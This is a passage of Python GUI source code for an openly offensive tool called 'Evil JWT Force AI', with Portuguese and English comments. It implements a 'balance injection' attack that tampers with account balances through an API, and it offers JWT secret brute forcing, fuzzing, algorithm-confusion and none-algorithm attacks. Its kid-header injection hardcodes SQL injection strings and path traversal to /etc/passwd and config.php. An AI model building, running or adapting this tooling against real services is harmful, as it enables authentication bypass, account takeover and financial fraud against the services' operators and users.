                                if str(value) == new_balance:
                                    self.master.after(0, lambda: self.update_injection_results(
                                        f"INJEÇÃO BEM-SUCEDIDA! Valor do saldo foi alterado para {value}\n", "success"
                                    ))
                                else:
                                    self.master.after(0, lambda: self.update_injection_results(
                                        f"Campo de saldo encontrado mas valor ({value}) não corresponde ao valor injetado\n", "warning"
                                    ))
                    
                    if not balance_in_response:
                        self.master.after(0, lambda: self.update_injection_results(
                            "Nenhum campo de saldo encontrado na resposta. Verifique se a injeção foi bem-sucedida.\n", "warning"
                        ))
                    
                except ValueError:
                    # Not JSON, display as text
                    self.master.after(0, lambda: self.update_injection_results(
                        f"Corpo da Resposta (texto):\n{response.text[:500]}\n", "info"
                    ))
                
                # Conclude based on status code
                if 200 <= status_code < 300:
                    self.master.after(0, lambda: self.update_injection_results(
                        "Ataque completado com sucesso!\n", "success"
                    ))
                    self.master.after(0, lambda: self.status_msg.set("Ataque completado"))
                else:
                    self.master.after(0, lambda: self.update_injection_results(
                        f"Ataque completado com código de status {status_code}\n", "warning"
                    ))
                    self.master.after(0, lambda: self.status_msg.set(f"Ataque completado: Status {status_code}"))
                    
            except Exception as e:
                self.master.after(0, lambda: self.update_injection_results(
                    f"Erro durante o ataque: {str(e)}\n", "error"
                ))
                self.master.after(0, lambda: self.status_msg.set(f"Ataque falhou: {str(e)}"))
        
        # Iniciar a thread
        print("Iniciando thread de injeção de saldo")
        injection_thread = threading.Thread(target=run_attack, daemon=True)
        injection_thread.start()
        print("Thread de injeção de saldo iniciada")
    
    def update_injection_results(self, text, tag=None, clear=False):
        """Update the injection results text widget"""
        self.injection_results_text.config(state=tk.NORMAL)
        
        if clear:
            self.injection_results_text.delete(1.0, tk.END)
            
        if tag:
            self.injection_results_text.insert(tk.END, text, tag)
        else:
            self.injection_results_text.insert(tk.END, text)
            
        self.injection_results_text.see(tk.END)
        self.injection_results_text.config(state=tk.DISABLED)
    
    def clear_balance_injection(self):
        """Clear all balance injection fields"""
        self.api_url_entry.delete(0, tk.END)
        self.method_var.set("POST")
        self.injection_token_entry.delete(0, tk.END)
        self.current_balance_entry.delete(0, tk.END)
        self.new_balance_entry.delete(0, tk.END)
        self.balance_field_entry.delete(0, tk.END)
        self.balance_field_entry.insert(0, "balance")
        
        self.request_body_text.delete(1.0, tk.END)
        default_json = '{\n  "userId": "123456",\n  "balance": 0,\n  "currency": "BRL"\n}'
        self.request_body_text.insert(tk.END, default_json)
        
        self.update_injection_results("", clear=True)
        self.status_msg.set("Pronto")
    
    def setup_manual_attack_tab(self):
        """Setup the manual attack tab"""
        self.manual_frame = tk.Frame(self.manual_attack_tab, bg="#1e1e1e")
        self.manual_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Target input section
        self.manual_input_frame = tk.LabelFrame(
            self.manual_frame,
            text="Target URL",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.manual_input_frame.pack(fill=tk.X, pady=(0, 20))
        
        # URL entry
        self.manual_url_frame = tk.Frame(self.manual_input_frame, bg="#252525")
        self.manual_url_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.manual_url_label = tk.Label(
            self.manual_url_frame,
            text="Target URL:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.manual_url_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.manual_url_entry = tk.Entry(
            self.manual_url_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.manual_url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Attack type selection
        self.attack_type_frame = tk.Frame(self.manual_input_frame, bg="#252525")
        self.attack_type_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.attack_type_label = tk.Label(
            self.attack_type_frame,
            text="Attack Type:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.attack_type_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.attack_type_var = tk.StringVar(value="bruteforce")
        self.attack_type_menu = tk.OptionMenu(
            self.attack_type_frame,
            self.attack_type_var,
            "bruteforce",
            "sql_injection",
            "xss",
            "custom"
        )
        self.attack_type_menu.config(bg="#333333", fg="white", activebackground="#444444", activeforeground="white")
        self.attack_type_menu["menu"].config(bg="#333333", fg="white")
        self.attack_type_menu.pack(side=tk.LEFT, padx=(0, 10))
        
        # Wordlist file
        self.wordlist_frame = tk.Frame(self.manual_input_frame, bg="#252525")
        self.wordlist_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.wordlist_label = tk.Label(
            self.wordlist_frame,
            text="Wordlist File:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.wordlist_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.wordlist_entry = tk.Entry(
            self.wordlist_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.wordlist_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        self.wordlist_btn = tk.Button(
            self.wordlist_frame,
            text="Browse",
            command=self.browse_wordlist,
            bg="#333333",
            fg="white"
        )
        self.wordlist_btn.pack(side=tk.LEFT)
        
        # Custom payload (for custom attack)
        self.payload_frame = tk.Frame(self.manual_input_frame, bg="#252525")
        self.payload_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.payload_label = tk.Label(
            self.payload_frame,
            text="Custom Payload:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.payload_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.payload_entry = tk.Entry(
            self.payload_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.payload_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Action buttons
        self.manual_action_frame = tk.Frame(self.manual_input_frame, bg="#252525")
        self.manual_action_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.attack_btn = tk.Button(
            self.manual_action_frame,
            text="Execute Attack",
            command=self.execute_manual_attack,
            bg="#b00a0a",
            fg="white",
            font=("Arial", 10, "bold"),
            width=15
        )
        self.attack_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.clear_manual_btn = tk.Button(
            self.manual_action_frame,
            text="Clear",
            command=self.clear_manual_attack,
            bg="#333333",
            fg="white",
            width=10
        )
        self.clear_manual_btn.pack(side=tk.LEFT)
        
        # Results section
        self.manual_results_frame = tk.LabelFrame(
            self.manual_frame,
            text="Attack Results",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.manual_results_frame.pack(fill=tk.BOTH, expand=True)
        
        self.manual_results_text = scrolledtext.ScrolledText(
            self.manual_results_frame,
            bg="#333333",
            fg="white",
            font=("Consolas", 10)
        )
        self.manual_results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.manual_results_text.config(state=tk.DISABLED)
        
        # Configure tags for results
        self.manual_results_text.tag_configure("header", foreground="#00FFFF", font=("Consolas", 10, "bold"))
        self.manual_results_text.tag_configure("success", foreground="#00FF00")
        self.manual_results_text.tag_configure("error", foreground="#FF0000")
        self.manual_results_text.tag_configure("warning", foreground="#FFFF00")
        self.manual_results_text.tag_configure("info", foreground="#00FFFF")
    
    def browse_manual_wordlist(self):
        """Browse for wordlist file in manual attack tab"""
        file_path = filedialog.askopenfilename(
            title="Select Wordlist File",
            filetypes=[("All Files", "*.*"), ("Text Files", "*.txt"), ("Wordlist Files", "*.wordlist")]
        )
        if file_path:
            self.manual_wordlist_entry.delete(0, tk.END)
            self.manual_wordlist_entry.insert(0, file_path)
    
    def execute_manual_attack(self):
        """Execute the selected manual attack"""
        attack_type = self.attack_type_var.get()
        token = self.manual_token_entry.get().strip()
        wordlist = self.manual_wordlist_entry.get().strip()
        url = self.manual_url_entry.get().strip()
        
        # Validate token
        if not token:
            messagebox.showerror("Error", "JWT Token is required")
            return
        
        # Check if attack modules are available
        if not HAS_ATTACK_MODULES:
            messagebox.showerror("Error", "Attack modules are not available. Please check the logs.")
            return
        
        # Update status
        self.status_msg.set(f"Executing {attack_type}...")
        
        # Update results
        self.update_manual_results("", clear=True)
        self.update_manual_results(f"Executing {attack_type}\n", "header")
        self.update_manual_results("=" * 50 + "\n\n")
        self.update_manual_results(f"JWT Token: {token}\n\n")
        
        # Adicionar log para depuração
        print(f"Iniciando ataque {attack_type}")
        
        # Execute attack in background thread
        def run_attack():
            try:
                # Different attack types
                if attack_type == "JWT Brute Force":
                    if not wordlist:
                        self.master.after(0, lambda: messagebox.showerror("Error", "Wordlist is required for brute force attack"))
                        self.master.after(0, lambda: self.status_msg.set("Attack failed: Missing wordlist"))
                        return
                    
                    self.master.after(0, lambda: self.update_manual_results(f"Wordlist: {wordlist}\n\n", "info"))
                    self.master.after(0, lambda: self.update_manual_results("Starting brute force attack...\n"))
                    
                    # Usar o módulo de bruteforce real
                    try:
                        from modules.token_bruteforce import TokenBruteforcer
                        from modules.wordlist_manager import WordlistManager
                        
                        # Carregar e otimizar a wordlist
                        self.master.after(0, lambda: self.update_manual_results("Loading and optimizing wordlist...\n", "info"))
                        wordlist_manager = WordlistManager(wordlist)
                        optimized_wordlist = wordlist_manager.optimize_for_jwt()
                        
                        if not optimized_wordlist:
                            self.master.after(0, lambda: self.update_manual_results("Failed to load wordlist\n", "error"))
                            self.master.after(0, lambda: self.status_msg.set("Attack failed: Wordlist error"))
                            return
                        
                        self.master.after(0, lambda: self.update_manual_results(f"Loaded {len(optimized_wordlist)} words (optimized for JWT)\n", "info"))
                        
                        # Iniciar bruteforce
                        bruteforcer = TokenBruteforcer(token)
                        self.master.after(0, lambda: self.update_manual_results("Running brute force attack...\n", "info"))
                        result = bruteforcer.bruteforce_with_timeout(wordlist, timeout=120)  # 2 minutos de timeout
                        
                        if result.get('success'):
                            self.master.after(0, lambda: self.update_manual_results(
                                f"\n[+] SUCCESS! Secret found: {result.get('secret')}\n", "success"
                            ))
                            self.master.after(0, lambda: self.update_manual_results(
                                f"Tested {result.get('tested')} passwords in {result.get('time'):.2f} seconds\n" +
                                f"Rate: {result.get('rate'):.2f} passwords/second\n", "info"
                            ))
                        else:
                            self.master.after(0, lambda: self.update_manual_results(
                                f"\n[-] Failed to find secret key.\n", "error"
                            ))
                            self.master.after(0, lambda: self.update_manual_results(
                                f"Tested {result.get('tested')} passwords in {result.get('time'):.2f} seconds\n" +
                                f"Rate: {result.get('rate'):.2f} passwords/second\n", "info"
                            ))
                            
                            if result.get('error'):
                                self.master.after(0, lambda: self.update_manual_results(
                                    f"Error: {result.get('error')}\n", "error"
                                ))
                        
                    except ImportError as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error importing modules: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: Module error"))
                    except Exception as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error during brute force: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: {str(e)}"))
                    
                elif attack_type == "JWT Fuzzing":
                    if not url:
                        self.master.after(0, lambda: messagebox.showerror("Error", "Target URL is required for fuzzing attack"))
                        self.master.after(0, lambda: self.status_msg.set("Attack failed: Missing URL"))
                        return
                    
                    self.master.after(0, lambda: self.update_manual_results(f"Target URL: {url}\n\n", "info"))
                    self.master.after(0, lambda: self.update_manual_results("Starting fuzzing attack...\n"))
                    
                    # Usar o módulo de fuzzing real
                    try:
                        from modules.fuzz_jwt import JWTFuzzer
                        
                        fuzzer = JWTFuzzer(token, url)
                        self.master.after(0, lambda: self.update_manual_results("Running JWT fuzzing attack...\n", "info"))
                        
                        # Executar fuzzing básico
                        self.master.after(0, lambda: self.update_manual_results("Testing algorithm modifications...\n", "info"))
                        alg_results = fuzzer.fuzz_algorithm_header()
                        
                        self.master.after(0, lambda: self.update_manual_results("Testing payload modifications...\n", "info"))
                        payload_results = fuzzer.fuzz_payload()
                        
                        # Exibir resultados
                        if alg_results:
                            for result in alg_results:
                                if result.get('success'):
                                    self.master.after(0, lambda r=result: self.update_manual_results(
                                        f"[+] Successful attack: {r.get('type')}\n", "success"
                                    ))
                                    self.master.after(0, lambda r=result: self.update_manual_results(
                                        f"Modified token: {r.get('token')}\n", "info"
                                    ))
                                    if r.get('details'):
                                        self.master.after(0, lambda r=result: self.update_manual_results(
                                            f"Details: {r.get('details')}\n\n", "info"
                                        ))
                        
                        if payload_results:
                            for result in payload_results:
                                if result.get('success'):
                                    self.master.after(0, lambda r=result: self.update_manual_results(
                                        f"[+] Successful payload attack: {r.get('type')}\n", "success"
                                    ))
                                    self.master.after(0, lambda r=result: self.update_manual_results(
                                        f"Modified token: {r.get('token')}\n", "info"
                                    ))
                                    if r.get('details'):
                                        self.master.after(0, lambda r=result: self.update_manual_results(
                                            f"Details: {r.get('details')}\n\n", "info"
                                        ))
                        
                        if not any(r.get('success') for r in alg_results + payload_results):
                            self.master.after(0, lambda: self.update_manual_results(
                                "No successful attacks found.\n", "warning"
                            ))
                        
                    except ImportError as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error importing modules: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: Module error"))
                    except Exception as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error during fuzzing: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: {str(e)}"))
                
                elif attack_type == "Algorithm Confusion":
                    self.master.after(0, lambda: self.update_manual_results("Starting algorithm confusion attack...\n", "info"))
                    
                    # Usar o módulo de decriptação real
                    try:
                        from modules.jwt_decrypt import JWTDecrypt
                        
                        decryptor = JWTDecrypt()
                        self.master.after(0, lambda: self.update_manual_results("Testing algorithm confusion vulnerability...\n", "info"))
                        
                        # Verificar vulnerabilidade de confusão de chaves
                        key_confusion_result = decryptor.check_key_confusion(token)
                        
                        if key_confusion_result.get('success'):
                            if key_confusion_result.get('vulnerable'):
                                self.master.after(0, lambda: self.update_manual_results(
                                    "[+] Token is vulnerable to key confusion attack!\n", "success"
                                ))
                                
                                for result in key_confusion_result.get('results', []):
                                    if result.get('vulnerable'):
                                        self.master.after(0, lambda r=result: self.update_manual_results(
                                            f"Variant: {r.get('variant')}\n", "info"
                                        ))
                                        self.master.after(0, lambda r=result: self.update_manual_results(
                                            f"Modified token: {r.get('modified_token')}\n\n", "info"
                                        ))
                            else:
                                self.master.after(0, lambda: self.update_manual_results(
                                    "[-] Token is not vulnerable to key confusion attack.\n", "warning"
                                ))
                                
                                if key_confusion_result.get('message'):
                                    self.master.after(0, lambda r=key_confusion_result: self.update_manual_results(
                                        f"{r.get('message')}\n", "info"
                                    ))
                        else:
                            self.master.after(0, lambda: self.update_manual_results(
                                f"Error during key confusion test: {key_confusion_result.get('error')}\n", "error"
                            ))
                        
                    except ImportError as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error importing modules: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: Module error"))
                    except Exception as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error during algorithm confusion test: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: {str(e)}"))
                
                elif attack_type == "None Algorithm Attack":
                    self.master.after(0, lambda: self.update_manual_results("Starting none algorithm attack...\n", "info"))
                    
                    # Usar o módulo de decriptação real
                    try:
                        from modules.jwt_decrypt import JWTDecrypt
                        
                        decryptor = JWTDecrypt()
                        self.master.after(0, lambda: self.update_manual_results("Testing none algorithm vulnerability...\n", "info"))
                        
                        # Verificar vulnerabilidade de algoritmo none
                        none_algo_result = decryptor.check_none_algorithm(token)
                        
                        if none_algo_result.get('success'):
                            if none_algo_result.get('vulnerable'):
                                self.master.after(0, lambda: self.update_manual_results(
                                    "[+] Token is vulnerable to none algorithm attack!\n", "success"
                                ))
                                
                                for result in none_algo_result.get('results', []):
                                    if result.get('vulnerable'):
                                        self.master.after(0, lambda r=result: self.update_manual_results(
                                            f"Variant: {r.get('variant')}\n", "info"
                                        ))
                                        self.master.after(0, lambda r=result: self.update_manual_results(
                                            f"Modified token: {r.get('modified_token')}\n\n", "info"
                                        ))
                            else:
                                self.master.after(0, lambda: self.update_manual_results(
                                    "[-] Token is not vulnerable to none algorithm attack.\n", "warning"
                                ))
                        else:
                            self.master.after(0, lambda: self.update_manual_results(
                                f"Error during none algorithm test: {none_algo_result.get('error')}\n", "error"
                            ))
                        
                    except ImportError as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error importing modules: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: Module error"))
                    except Exception as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error during none algorithm test: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: {str(e)}"))
                
                elif attack_type == "Kid Injection":
                    self.master.after(0, lambda: self.update_manual_results("Starting kid injection attack...\n", "info"))
                    
                    # Usar módulo jwt_utils para analisar e modificar o token
                    try:
                        from modules.jwt_utils import extract_parts, fuzz_jwt_claims
                        import base64
                        import json
                        
                        # Analisar o token
                        parts = extract_parts(token)
                        if not parts:
                            self.master.after(0, lambda: self.update_manual_results("Invalid token format.\n", "error"))
                            self.master.after(0, lambda: self.status_msg.set("Attack failed: Invalid token"))
                            return
                        
                        header = parts["header"]
                        payload = parts["payload"]
                        
                        # Modificar o header para incluir o kid parameter
                        self.master.after(0, lambda: self.update_manual_results("Modifying token header to include kid parameter...\n", "info"))
                        
                        # Variações de kid para injeção SQL
                        kid_variations = [
                            "../../../../../../dev/null",
                            "' OR 1=1 -- ",
                            "../../../../../../../etc/passwd",
                            "kid' UNION SELECT 'secret' -- ",
                            "' OR '1'='1",
                            "' OR '1'='1' -- ",
                            "../../../../../../../../../../../var/www/config.php",
                            "' UNION SELECT 'key' -- "
                        ]
                        
                        modified_tokens = []
                        
                        for kid_value in kid_variations:
                            # Modificar o header
                            modified_header = header.copy()
                            modified_header["kid"] = kid_value
                            
                            # Codificar o header modificado
                            header_json = json.dumps(modified_header, separators=(',', ':'))
                            header_b64 = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip("=")
                            
                            # Codificar o payload
                            payload_json = json.dumps(payload, separators=(',', ':'))
                            payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip("=")
                            
                            # Criar token modificado (sem assinatura válida)
                            modified_token = f"{header_b64}.{payload_b64}."
                            modified_tokens.append({
                                "kid": kid_value,
                                "token": modified_token
                            })
                        
                        # Exibir tokens modificados
                        self.master.after(0, lambda: self.update_manual_results("\nGenerated tokens with kid injection:\n", "header"))
                        for mod in modified_tokens:
                            self.master.after(0, lambda m=mod: self.update_manual_results(
                                f"kid = {m['kid']}\n", "info"
                            ))
                            self.master.after(0, lambda m=mod: self.update_manual_results(
                                f"token = {m['token']}\n\n", "info"
                            ))
                        
                        self.master.after(0, lambda: self.update_manual_results(
                            "Note: These tokens have invalid signatures and will be rejected by systems with proper signature verification.\n" +
                            "They may work on systems that don't verify signatures or are vulnerable to SQL injection via the kid parameter.\n", 
                            "warning"
                        ))
                        
                    except ImportError as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error importing modules: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: Module error"))
                    except Exception as e:
                        self.master.after(0, lambda: self.update_manual_results(f"Error during kid injection: {str(e)}\n", "error"))
                        self.master.after(0, lambda: self.status_msg.set(f"Attack failed: {str(e)}"))
                
                self.master.after(0, lambda: self.status_msg.set("Attack completed"))
                
            except Exception as e:
                self.master.after(0, lambda: self.update_manual_results(f"Error during attack: {str(e)}\n", "error"))
                self.master.after(0, lambda: self.status_msg.set(f"Attack failed: {str(e)}"))
        
        # Iniciar a thread
        print("Iniciando thread de ataque")
        attack_thread = threading.Thread(target=run_attack, daemon=True)
        attack_thread.start()
        print("Thread de ataque iniciada")
    
    def update_manual_results(self, text, tag=None, clear=False):
        """Update the manual attack results text"""
        self.manual_results_text.config(state=tk.NORMAL)
        
        if clear:
            self.manual_results_text.delete(1.0, tk.END)
            
        if tag:
            self.manual_results_text.insert(tk.END, text, tag)
        else:
            self.manual_results_text.insert(tk.END, text)
            
        self.manual_results_text.see(tk.END)
        self.manual_results_text.config(state=tk.DISABLED)
    
    def clear_manual_attack(self):
        """Clear all manual attack fields"""
        self.manual_token_entry.delete(0, tk.END)
        self.manual_wordlist_entry.delete(0, tk.END)
        self.manual_url_entry.delete(0, tk.END)
        self.update_manual_results("", clear=True)
        self.status_msg.set("Ready")
    
    def setup_footer(self):
        """Setup the footer section"""
        self.footer_frame = tk.Frame(self.main_frame, bg="#2d2d2d", height=30)
        self.footer_frame.pack(fill=tk.X, pady=(20, 0))

        # Version info
        self.version_label = tk.Label(
            self.footer_frame,
            text="Evil JWT Force AI v1.0",
            font=("Arial", 8),
            fg="#aaaaaa",
            bg="#2d2d2d"
        )
        self.version_label.pack(side=tk.LEFT)

        # Status message
        self.status_msg = tk.StringVar()
        self.status_msg.set("Ready")

        self.status_msg_label = tk.Label(
            self.footer_frame,
            textvariable=self.status_msg,
            font=("Arial", 8),
            fg="#aaaaaa",
            bg="#2d2d2d"
        )
        self.status_msg_label.pack(side=tk.RIGHT)
    
    def initialize_ai_components(self):
        """Initialize AI components"""
        try:
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write("Inicializando componentes de IA...\n", "info")
            from ai_module.chat_manager import ChatManager
            # Obter a chave da API da OpenAI do ambiente
            openai_api_key = os.environ.get('OPENAI_API_KEY')
            if not openai_api_key:
                if hasattr(self, 'ai_console') and self.ai_console is not None:
                    self.ai_console.write("Chave da API da OpenAI não encontrada. Configure OPENAI_API_KEY no ambiente.\n", "warning")
                return
            else:
                if hasattr(self, 'ai_console') and self.ai_console is not None:
                    self.ai_console.write("Chave da API da OpenAI encontrada no ambiente.\n", "info")
            self.chat_manager = ChatManager(hf_api_key=os.environ.get('HF_TOKEN'))
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write("Gerenciador de chat inicializado com sucesso.\n", "success")
        except Exception as e:
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write(f"Erro ao inicializar componentes de IA: {str(e)}\n", "error")
            self.chat_manager = None
    
    def reinitialize_ai_components(self):
        """Reinitialize AI components"""
        try:
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write("Reinicializando componentes de IA...\n")
            
            self.ai_engine = None
            self.chat_manager = None
            if HAS_AI_MODULES:
                try:
                    from ai_system.engine import AIEngine
                    self.ai_engine = AIEngine()
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write("Engine de IA inicializado com sucesso.\n", "success")
                except Exception as e:
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write(f"Erro ao inicializar engine de IA: {str(e)}\n", "error")
                    print(f"Erro ao inicializar engine de IA: {str(e)}")
            else:
                if hasattr(self, 'ai_console') and self.ai_console is not None:
                    self.ai_console.write("Módulos de IA não disponíveis. Verifique a instalação.\n", "error")
                print("Módulos de IA não disponíveis. Verifique a instalação.")

            # Tentar inicializar o gerenciador de chat
            if AI_MODULE_AVAILABLE:
                try:
                    from ai_module.chat_manager import ChatManager
                    self.chat_manager = ChatManager()
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write("Gerenciador de chat inicializado com sucesso.\n", "success")
                except Exception as e:
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write(f"Erro ao inicializar gerenciador de chat: {str(e)}\n", "error")
                    print(f"Erro ao inicializar gerenciador de chat: {str(e)}")
            else:
                if hasattr(self, 'ai_console') and self.ai_console is not None:
                    self.ai_console.write("Módulo de chat não disponível. Verifique a instalação.\n", "error")
                print("Módulo de chat não disponível. Verifique a instalação.")

            # Verificar se a API da OpenAI está disponível
            if self.chat_manager:
                try:
                    # Tentar carregar a chave da API do ambiente
                    api_key = os.environ.get("OPENAI_API_KEY", "")
                    if api_key:
                        if hasattr(self, 'ai_console') and self.ai_console is not None:
                            self.ai_console.write("Chave de API da OpenAI encontrada no ambiente.\n", "success")
                    else:
                        if hasattr(self, 'ai_console') and self.ai_console is not None:
                            self.ai_console.write("Chave de API da OpenAI não encontrada no ambiente. Verifique as configurações.\n", "warning")
                        print("Chave de API da OpenAI não encontrada no ambiente. Verifique as configurações.")
                except Exception as e:
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write(f"Erro ao verificar chave de API da OpenAI: {str(e)}\n", "error")
                    print(f"Erro ao verificar chave de API da OpenAI: {str(e)}")
            else:
                if hasattr(self, 'ai_console') and self.ai_console is not None:
                    self.ai_console.write("Gerenciador de chat não inicializado. API de IA não disponível.\n", "error")
                print("Gerenciador de chat não inicializado. API de IA não disponível.")
        except Exception as e:
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write(f"Erro ao reinicializar componentes de IA: {str(e)}\n", "error")
            if hasattr(self, 'status_msg'):
                self.status_msg.set("Erro na inicialização da IA")
            self.chat_manager = None
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write("API de IA não disponível após reinicialização. Usando respostas padrão.\n", "warning")

    def show_token_analysis(self):
        """Switch to token analysis tab"""
        self.notebook.select(self.token_analysis_tab)
    
    def show_target_scan(self):
        """Switch to target scan tab"""
        self.notebook.select(self.target_scan_tab)
    
    def show_balance_injection(self):
        """Switch to balance injection tab"""
        self.notebook.select(self.balance_injection_tab)
    
    def show_manual_attack(self):
        """Switch to manual attack tab"""
        self.notebook.select(self.manual_attack_tab)
    
    def browse_token_file(self):
        """Open file dialog to select token file"""
        file_path = filedialog.askopenfilename(
            title="Select Token File",
            filetypes=[("All Files", "*.*"), ("Text Files", "*.txt"), ("JWT Files", "*.jwt")]
        )
        if file_path:
            self.token_file_entry.delete(0, tk.END)
            self.token_file_entry.insert(0, file_path)
    
    def browse_wordlist(self):
        """Open file dialog to select wordlist file"""
        file_path = filedialog.askopenfilename(
            title="Select Wordlist File",
            filetypes=[("All Files", "*.*"), ("Text Files", "*.txt"), ("Wordlist Files", "*.wordlist")]
        )
        if file_path:
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, file_path)
    
    def analyze_token(self):
        """Analyze the JWT token in the token entry field"""
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showinfo("Entrada Vazia", "Por favor, insira um token JWT para análise.")
            return
        
        # Update status
        self.status_msg.set("Analisando token...")
        
        # Clear previous results
        self.clear_token_analysis()
        
        # Update output
        self.update_token_details(token, {"status": "analyzing"})
        
        # Run analysis in background thread to keep UI responsive
        threading.Thread(target=self._run_token_analysis, args=(token,), daemon=True).start()

    def _run_token_analysis(self, token):
        """Run token analysis in background thread"""
        try:
            # Verificar se os módulos de ataque estão disponíveis
            if HAS_ATTACK_MODULES:
                # Usar os módulos de ataque para análise
                try:
                    # Obter partes do token
                    parsed = extract_parts(token)
                    if not parsed:
                        self.master.after(0, lambda: self.update_token_details(token, {"error": "Token inválido ou mal-formado"}))
                        self.master.after(0, lambda: self.status_msg.set("Erro na análise: Token inválido"))
                        return
                    
                    # Criar instância do JWTDecrypt para análise avançada
                    decryptor = JWTDecrypt()
                    vulnerabilities = decryptor.get_vulnerabilities(token).get('vulnerabilities', [])
                    
                    # Estruturar a análise
                    analysis = {
                        'valid': True,
                        'header': parsed['header'],
                        'payload': parsed['payload'],
                        'vulnerabilities': vulnerabilities,
                        'recommendations': [
                            "Use algoritmos assimétricos como RS256 em vez de HS256",
                            "Adicione uma claim de expiração (exp) ao token",
                            "Não armazene dados sensíveis no payload",
                            "Use chaves fortes e seguras"
                        ]
                    }
                    
                    # Update UI with results
                    self.master.after(0, lambda: self.update_token_details(token, analysis))
                    self.master.after(0, lambda: self.update_token_vulnerabilities(analysis, {"recommendations": analysis['recommendations']}))
                    self.master.after(0, lambda: self.status_msg.set("Análise completa"))
                    return
                except Exception as e:
                    logger = logging.getLogger('AI_INTERFACE')
                    logger.error(f"Erro ao usar módulos de ataque: {str(e)}")
                    # Continuar com o fluxo normal se ocorrer um erro
            
            # Verificar se a API LLM está disponível
            if self.llm_api:
                # Analisar token usando a API LLM
                analysis = self.llm_api.analyze_token(token)
                # Update UI with results
                self.master.after(0, lambda: self.update_token_details(token, analysis))
                self.master.after(0, lambda: self.update_token_vulnerabilities(analysis, analysis.get('recommendations', {})))
                self.master.after(0, lambda: self.status_msg.set("Análise completa"))
            else:
                # Fallback para análise básica
                logger = logging.getLogger('AI_INTERFACE')
                logger.warning("Nenhuma API LLM disponível, usando análise básica")
                
                # Obter partes do token
                from modules.jwt_utils_simple import decode_token_parts
                token_parts = decode_token_parts(token)
                
                # Criar análise básica
                if token_parts and 'header' in token_parts and 'payload' in token_parts:
                    analysis = {
                        'valid': True,
                        'header': token_parts['header'],
                        'payload': token_parts['payload'],
                        'vulnerabilities': []
                    }
                    self.master.after(0, lambda: self.update_token_details(token, analysis))
                    self.master.after(0, lambda: self.update_token_vulnerabilities(analysis, {"recommendations": []}))
                    self.master.after(0, lambda: self.status_msg.set("Análise básica completa"))
                else:
                    self.master.after(0, lambda: self.update_token_details(token, {"error": "Token inválido ou mal-formado"}))
                    self.master.after(0, lambda: self.status_msg.set("Erro na análise: Token inválido"))
        except Exception as e:
            error_msg = str(e)
            self.master.after(0, lambda: self.update_token_details(token, {"error": error_msg}))
            self.master.after(0, lambda: self.status_msg.set(f"Erro na análise: {error_msg}"))
    
    def update_token_details(self, token, analysis):
        """Update the token details display"""
        self.token_details_text.config(state=tk.NORMAL)
        self.token_details_text.delete(1.0, tk.END)
        
        # Display token
        self.token_details_text.insert(tk.END, "JWT Token:\n", "title")
